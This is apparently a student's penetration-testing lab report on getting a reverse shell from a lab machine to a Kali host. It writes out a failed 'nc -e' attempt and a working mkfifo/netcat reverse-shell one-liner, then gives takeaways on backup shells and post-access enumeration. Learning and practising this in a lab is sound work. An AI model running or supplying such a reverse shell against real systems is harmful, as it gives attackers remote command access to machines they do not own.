@@ -1,0 +1,23 @@
+
+
+REVERSE SHELL COMMAND EXECUTION
+Report 
+
+During this penetration testing exercise, I attempted to gain reverse shell access to a target machine (192.168.63.141) from my Kali Linux system (192.168.63.1). 
+My initial command nc -e /bin/bas 192.168.63.1 12345 failed due to the fact that many modern netcat 
+versions have the -e flag disabled for security reasons. Although the connection established, no interactive shell was received.
+
+The successful exploitation came from using a more sophisticated one-liner:
+ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.63.1 12345 >/tmp/f. 
+
+This command created a named pipe (FIFO) that established true bidirectional communication between the machines. 
+Once connected, I navigated through various directories using cd, checked my location with pwd, listed contents with ls,
+ and identified the compromised user with whoami, confirming successful shell access to the target system.
+
+                5 Key Takeaways
+
+    1.	Check your syntax – "bas" instead of "bash" breaks everything
+    2.	Netcat's -e often disabled – Always have backup reverse shells ready
+    3.	Named pipes = bidirectional – They work when simple netcat fails
+    4.	Connection ≠ shell – Verify you can actually run commands
+    5.	Enumerate immediately – Run pwd, whoami, ls as soon as you're in
